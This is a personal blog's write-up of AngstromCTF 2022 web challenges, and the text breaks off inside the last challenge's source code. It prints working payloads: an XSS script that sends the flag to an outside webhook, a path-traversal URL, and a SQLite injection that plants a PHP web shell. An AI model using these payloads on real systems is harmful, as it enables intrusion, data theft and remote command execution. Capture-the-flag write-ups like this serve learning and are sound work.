<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="AngstromCTF 2022" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="From AngstromCTF2022" /><meta property="og:description" content="From AngstromCTF2022" /><link rel="canonical" href="https://to016.github.io//posts/angstromctf2022/" /><meta property="og:url" content="https://to016.github.io//posts/angstromctf2022/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-02T22:25:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="AngstromCTF 2022" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-05-22T21:49:59+07:00","datePublished":"2022-05-02T22:25:00+07:00","description":"From AngstromCTF2022","headline":"AngstromCTF 2022","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/angstromctf2022/"},"url":"https://to016.github.io//posts/angstromctf2022/"}</script><title>AngstromCTF 2022 | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>AngstromCTF 2022</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/angstromctf2022/logo.jpg" class="preview-img bg" alt="AngstromCTF2022 logo" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>AngstromCTF 2022</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">T√¥ ƒê·ªânh Nguy√™n</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1651505100" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-02 </em> </span> <span> Updated <em class="timeago" data-ts="1653230999" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-22 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2384 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><p>My solution for some web challenges in this competition</p><h2 id="the-flash"><span class="mr-2">The Flash</span><a href="#the-flash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Use DOM breakpoints in Chrome devtools, right click on <code class="language-plaintext highlighter-rouge">p</code> tag and chose <code class="language-plaintext highlighter-rouge">Break on -&gt; subtree modifications</code> then step over to get flag</p><blockquote class="prompt-info"><div><p><strong>actf{sp33dy_l1ke_th3_fl4sh}</strong></p></div></blockquote><hr /><h2 id="auth-skip"><span class="mr-2">Auth Skip</span><a href="#auth-skip" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>set cookie: <code class="language-plaintext highlighter-rouge">user=admin</code></p><blockquote class="prompt-info"><div><p><strong>actf{passwordless_authentication_is_the_new_hip_thing}</strong></p></div></blockquote><hr /><h2 id="crumbs"><span class="mr-2">crumbs</span><a href="#crumbs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>exploit script:</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">TARGET</span> <span class="o">=</span> <span class="s">"https://crumbs.web.actf.co/"</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="nb">next</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1002</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET</span> <span class="o">+</span> <span class="nb">next</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1001</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="k">break</span>
    <span class="nb">next</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">"Go to (.*)"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">next</span><span class="p">)</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><strong>actf{w4ke_up_to_th3_m0on_6bdc10d7c6d5}</strong></p></div></blockquote><hr /><h2 id="xtra-salty-sardines"><span class="mr-2">Xtra Salty Sardines</span><a href="#xtra-salty-sardines" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Pay attention to the flowing lines:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">name</span>
    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&amp;amp;</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&amp;quot;</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">'</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&amp;apos;</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&amp;lt;</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&amp;gt;</span><span class="dl">"</span><span class="p">);</span>
</pre></table></code></div></div><p>I abuse that:</p><blockquote class="prompt-tip"><div><p>The <code class="language-plaintext highlighter-rouge">replace()</code> method returns a new string with some or all matches of a <code class="language-plaintext highlighter-rouge">pattern</code> replaced by a replacement. The <code class="language-plaintext highlighter-rouge">pattern</code> can be a string or a <code class="language-plaintext highlighter-rouge">RegExp</code>, and the replacement can be a string or a function called for each match. If pattern is a <strong>string</strong>, only the <strong>first</strong> occurrence will be replaced.</p></div></blockquote><p>Payload:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>'<span class="nt">&lt;&gt;&lt;/h1&gt;&lt;script&gt;</span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">);</span> <span class="nx">x</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87</span><span class="dl">'</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)};</span> <span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><strong>actf{those_sardines_are_yummy_yummy_in_my_tummy}</strong></p></div></blockquote><hr /><h2 id="school-unblocker"><span class="mr-2">School unblocker</span><a href="#school-unblocker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Use <a href="https://stackoverflow.com/questions/38810114/node-js-with-express-how-to-redirect-a-post-request#:~:text=app.post(%27/%27%2C%20function(req%2C%20res)%20%7B%0A%20%20res.redirect(307%2C%20%27/test%27)%3B%0A%7D)%3B">this</a>.</p><p>Exploit script:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">)</span> <span class="o">||</span> <span class="mi">8888</span><span class="p">;</span>


<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="mi">307</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://127.0.0.1:8080/flag</span><span class="dl">"</span><span class="p">)</span>

<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Server listening on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">});</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><strong>actf{dont_authenticate_via_ip_please}</strong></p></div></blockquote><hr /><h2 id="art-gallery"><span class="mr-2">Art Gallery</span><a href="#art-gallery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>LFI in <code class="language-plaintext highlighter-rouge">member</code> parameter.</p><blockquote class="prompt-tip"><div><p>Noted that <code class="language-plaintext highlighter-rouge">/proc/1/cwd/</code> point to the current working directory in the docker container.</p></div></blockquote><p>Send the following payload to fetch <code class="language-plaintext highlighter-rouge">Dockerfile</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://art-gallery.web.actf.co/gallery/?member=../../../../proc/1/cwd/Dockerfile
</pre></table></code></div></div><p>Dockerfile:</p><div class="language-docker highlighter-rouge"><div class="code-header"> <span data-label-text="Docker"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> node:17-bullseye-slim</span>

<span class="k">WORKDIR</span><span class="s"> /app</span>
<span class="k">COPY</span><span class="s"> . .</span>
<span class="k">RUN </span><span class="nb">mv </span>git .git
<span class="k">RUN </span>npm ci

<span class="k">ENV</span><span class="s"> PORT=8080</span>

<span class="k">EXPOSE</span><span class="s"> 8080</span>

<span class="k">CMD</span><span class="s"> ["node", "index.js"]</span>
</pre></table></code></div></div><p>The next step is to exploit the <code class="language-plaintext highlighter-rouge">.git</code> folder using <a href="https://github.com/WangYihang/GitHacker">GitHacker</a>.</p><p>After fetching all sources, use <code class="language-plaintext highlighter-rouge">git log</code> to check log commit.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>‚îå‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]
‚îî‚îÄ‚îÄ‚ïº $git log
commit 1c584170fb33ae17a63e22456f19601efb1f23db (HEAD, origin/master, origin/HEAD, master)
Author: imposter &lt;sus@aplet.me&gt;
Date:   Tue Apr 26 21:47:45 2022 -0400

    bury secrets

commit 713a4aba8af38c9507ced6ea41f602b105ca4101
Author: imposter &lt;sus@aplet.me&gt;
Date:   Tue Apr 26 21:44:48 2022 -0400

    remove vital secrets

commit 56449caeb7973b88f20d67b4c343cbb895aa6bc7
Author: imposter &lt;sus@aplet.me&gt;
Date:   Tue Apr 26 21:44:01 2022 -0400

    add program
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">git checkout</code> to check a commit.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>‚îÄ[‚úó]‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]
‚îî‚îÄ‚îÄ‚ïº $git checkout 56449caeb7973b88f20d67b4c343cbb895aa6bc7
Previous HEAD position was 1c58417 bury secrets
HEAD is now at 56449ca add program
‚îå‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]
‚îî‚îÄ‚îÄ‚ïº $ls
error.html  flag.txt  images  index.html  index.js  package.json  package-lock.json
‚îå‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]
‚îî‚îÄ‚îÄ‚ïº $cat flag.txt 
actf{lfi_me_alone_and_git_out_341n4kaf5u59v}
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><strong>actf{lfi_me_alone_and_git_out_341n4kaf5u59v}</strong></p></div></blockquote><hr /><h2 id="secure-vault"><span class="mr-2">Secure Vault</span><a href="#secure-vault" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Create an account: <code class="language-plaintext highlighter-rouge">bla:bla</code> then save the <code class="language-plaintext highlighter-rouge">token</code> value (jwt of bla account) after that <code class="language-plaintext highlighter-rouge">Delete account</code>. Then set the cookie value with <code class="language-plaintext highlighter-rouge">token:&lt;jwt token of bla account&gt;</code> -&gt; return flag.</p><p>The reason why it works is due to the following two lines in <code class="language-plaintext highlighter-rouge">index.js</code>:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">uid</span><span class="p">);</span>
<span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">text/plain</span><span class="dl">"</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">restricted</span> <span class="p">?</span> <span class="nx">user</span><span class="p">.</span><span class="nx">vault</span> <span class="p">:</span> <span class="nx">flag</span><span class="p">);</span>
</pre></table></code></div></div><p>if we send an old jwt, then <code class="language-plaintext highlighter-rouge">user={}</code> and <code class="language-plaintext highlighter-rouge">user.restricted=undefined</code> (because it has been already deleted from <code class="language-plaintext highlighter-rouge">UserStore</code>).</p><blockquote class="prompt-info"><div><p><strong>actf{is_this_what_uaf_is}</strong></p></div></blockquote><hr /><h2 id="noflags"><span class="mr-2">NoFlags</span><a href="#noflags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Dockerfile:</p><div class="language-docker highlighter-rouge"><div class="code-header"> <span data-label-text="Docker"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> php:8.1.5-apache-bullseye</span>

<span class="k">COPY</span><span class="s"> printflag /printflag</span>
<span class="k">RUN </span><span class="nb">chmod </span>111 /printflag
<span class="k">COPY</span><span class="s"> src /var/www/html</span>


<span class="k">RUN </span><span class="nb">chown</span> <span class="nt">-R</span> root:root /var/www/html <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> <span class="nt">-R</span> 555 /var/www/html        
<span class="k">RUN </span><span class="nb">mkdir</span> /var/www/html/abyss <span class="o">&amp;&amp;</span><span class="se">\
</span>    <span class="nb">chown</span> <span class="nt">-R</span> root:root /var/www/html/abyss <span class="o">&amp;&amp;</span><span class="se">\
</span>    <span class="nb">chmod</span> <span class="nt">-R</span> 333 abyss

<span class="k">EXPOSE</span><span class="s"> 80</span>
</pre></table></code></div></div><p>From this file, i figure out following things:</p><ul><li><code class="language-plaintext highlighter-rouge">printflag</code> a file with only-executable permission that used to print flag<li><code class="language-plaintext highlighter-rouge">/var/www/html</code>: readable and executable permission<li><code class="language-plaintext highlighter-rouge">/var/www/html/abyss</code>: writable and executable permission</ul><p>=&gt; The target to achieve is RCE using sqlite injection.</p><p>Read more from <a href="https://twosixtech.com/sqlite-as-a-shell-script/">here</a>.</p><p>payload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>');ATTACH DATABASE '/var/www/html/abyss/exp.php' AS exp;CREATE TABLE exp.pwn (dataz text);INSERT INTO exp.pwn (dataz) VALUES ('&lt;?system($_GET["cmd"]); ?&gt;');--
</pre></table></code></div></div><p>Result:</p><p><img data-src="/assets/img/angstromctf2022/NoFlags/flag.png" alt="flag" data-proofer-ignore> <em>flag</em></p><hr /><h2 id="sustenance"><span class="mr-2">Sustenance</span><a href="#sustenance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I had worked in this challenge for 3 days, searching, trying, playing around with it but i couldn‚Äôt come up with a solution. So i will write what i have learned from orther people‚Äôs writeups üòó .</p><p>Overview:</p><p><img data-src="/assets/img/angstromctf2022/Sustenance/overview.png" alt="overview" data-proofer-ignore> <em>overview</em></p><p>Source:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">cookie-parser</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}));</span>

<span class="c1">// environment config</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">)</span> <span class="o">||</span> <span class="mi">8080</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">adminSecret</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">secretpw</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">flag</span> <span class="o">=</span>
    <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span>
